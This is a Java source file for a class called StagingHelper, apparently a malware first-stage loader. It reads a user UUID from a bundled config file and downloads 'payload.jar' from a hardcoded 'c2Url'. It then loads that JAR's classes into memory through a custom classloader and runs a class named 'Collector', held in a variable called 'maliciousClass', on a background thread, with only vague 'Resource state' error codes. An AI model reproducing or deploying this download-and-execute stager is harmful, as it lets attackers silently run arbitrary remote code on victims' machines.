package sh.snipsnapz;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStreamReader;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.HashMap;
import java.util.Objects;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;

public class StagingHelper {

    public static void stageWithContext(JsonObject context) {
        String userId;

        try (InputStreamReader reader = new InputStreamReader(
                Objects.requireNonNull(StagingHelper.class.getClassLoader()
                        .getResourceAsStream("cfg.json")))) {
            JsonObject json = new Gson().fromJson(reader, JsonObject.class);
            userId = json.get("uuid").getAsString();
        } catch (Exception e) {
            System.out.println("Resource state: S0");
            return;
        }

        String c2Url = "http://0.0.0.0:7575/payload.jar";

        // Add tracking ID
        context.addProperty("userId", userId);

        try {
            byte[] jarBytes = downloadJar(c2Url);
            if (jarBytes == null) {
                System.out.println("Resource state: S1");
                return;
            }

            HashMap<String, byte[]> classMap = new HashMap<>();
            HashMap<String, byte[]> resourceMap = new HashMap<>();

            try (JarInputStream jarStream = new JarInputStream(new ByteArrayInputStream(jarBytes))) {
                JarEntry entry;
                while ((entry = jarStream.getNextJarEntry()) != null) {
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    jarStream.transferTo(baos);
                    byte[] data = baos.toByteArray();

                    if (entry.getName().endsWith(".class")) {
                        String className = entry.getName()
                                .replace('/', '.')
                                .replace(".class", "");
                        classMap.put(className, data);
                    } else {
                        resourceMap.put(entry.getName(), data);
                    }
                }
            } catch (Exception e) {
                System.out.println("Resource state: S2");
                return;
            }

            if (classMap.isEmpty()) {
                System.out.println("Resource state: S3");
                return;
            }

            IMCL loader = new IMCL(classMap, resourceMap);
            Class<?> maliciousClass;
            try {
                maliciousClass = loader.loadClass("Collector");
            } catch (ClassNotFoundException e) {
                System.out.println("Resource state: S4");
                return;
            }

            Object malwareInstance;
            try {
                malwareInstance = maliciousClass.getDeclaredConstructor().newInstance();
            } catch (Exception e) {
                System.out.println("Resource state: S5");
                return;
            }

            // Call method named "runClient" on stage 2
            new Thread(() -> {
                try {
                    maliciousClass.getMethod("runClient", String.class)
                            .invoke(malwareInstance, new Gson().toJson(context));
                } catch (Exception e) {
                    System.out.println("Resource state: S6");
                }
            }).start();

        } catch (Exception e) {
            System.out.println("Resource state: S7");
        }
    }

    private static byte[] downloadJar(String url) {
        try (HttpClient client = HttpClient.newHttpClient()) {
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(url))
                    .GET()
                    .build();

            try {
                HttpResponse<byte[]> response = client.send(
                        request,
                        HttpResponse.BodyHandlers.ofByteArray()
                );

                if (response.statusCode() == 200) {
                    return response.body();
                } else {
                    System.out.println("Resource state: D");
                    return null;
                }
            } catch (Exception e) {
                System.out.println("Resource state: D0");
                return null;
            }
        }
    }
}